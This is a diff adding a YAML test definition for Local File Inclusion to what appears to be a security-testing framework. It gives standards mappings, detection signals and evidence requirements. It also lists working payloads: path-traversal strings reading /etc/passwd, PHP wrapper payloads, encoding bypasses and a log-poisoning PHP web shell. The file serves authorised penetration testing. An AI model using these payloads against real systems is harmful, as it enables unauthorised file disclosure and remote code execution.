@@ -1,0 +1,104 @@
+id: rce-lfi
+name: Local File Inclusion (LFI)
+category: rce
+description: >
+  Application includes local files based on user-supplied input without
+  proper sanitization. Attacker uses path traversal sequences (../) to read
+  arbitrary files from the server filesystem (passwords, config, source code,
+  logs). Can escalate to RCE via log poisoning, /proc/self/environ injection,
+  PHP wrappers (php://filter, php://input, expect://), or session file
+  manipulation.
+severity: high
+standards:
+  wstg:
+    - WSTG-ATHZ-01
+  asvs:
+    - "V12.3.1"
+    - "V5.3.8"
+  vrt:
+    - file_inclusion.lfi
+  cwe:
+    - CWE-22
+applies_to:
+  archetypes:
+    - all
+  surfaces:
+    - file-viewers
+    - template-loaders
+    - language-switchers
+    - download-endpoints
+    - include-parameters
+requires:
+  auth: none
+  inputs:
+    - parameters named file, page, template, language, include, path, document
+    - endpoints with path-based routing accepting user filenames
+  tools:
+    - curl
+    - ffuf
+signals:
+  positive:
+    - /etc/passwd or /etc/hosts contents returned in response
+    - ../ sequences traversed successfully (multiple levels)
+    - PHP wrappers return processed file content (php://filter base64)
+    - Different file requests return different content (no static fallback)
+    - Null byte or encoding bypass results in file read
+  negative:
+    - Input validated against allowlist (only specific files accessible)
+    - Application prepends/appends fixed extension (.php) preventing arbitrary reads
+    - Path canonicalization normalizes before use (realpath, os.path.realpath)
+    - open_basedir or chroot restricts file system access
+    - Application returns static error page regardless of file requested
+safety:
+  intrusive: false
+  data_modifying: false
+  rate_limited: false
+  requires_approval: false
+evidence:
+  required:
+    - curl command reading /etc/passwd or config file
+    - Response showing actual file content (not static error)
+    - Multiple traversal levels (depth testing)
+    - Screenshot of leaked content
+references:
+  urls:
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include
+    - https://portswigger.net/web-security/file-path-traversal
+  papers:
+    - OWASP File Inclusion Prevention Cheat Sheet
+  writeups: []
+workflow_mapping:
+  skill: rce
+  workflow: W3 (LFI)
+payload_families:
+  - name: basic_traversal
+    description: Simple path traversal sequences
+    examples:
+      - "../../../../etc/passwd"
+      - "....//....//....//....//etc/passwd"
+      - "..;/..;/..;/..;/etc/passwd"
+  - name: php_wrapper
+    description: PHP stream wrappers for file reads
+    examples:
+      - "php://filter/convert.base64-encode/resource=index.php"
+      - "php://filter/read=string.rot13/resource=/etc/passwd"
+      - "expect://id"
+  - name: log_poisoning
+    description: Inject PHP code into logs then include log file for RCE
+    examples:
+      - "<?php system($_GET['c']); ?> in User-Agent or Referer header"
+      - "Include /var/log/apache2/access.log or /proc/self/environ"
+  - name: encoding_bypass
+    description: URL encoding and double encoding to bypass filters
+    examples:
+      - "..%2F..%2F..%2F..%2Fetc%2Fpasswd"
+      - "..%252F..%252F..%252F..%252Fetc%252Fpasswd"
+      - "..\\/..\\/etc/passwd"
+tags:
+  - path-traversal
+  - file-read
+  - directory-traversal
+  - lfi
+  - php-wrapper
+  - log-poisoning
+  - escalation-to-rce
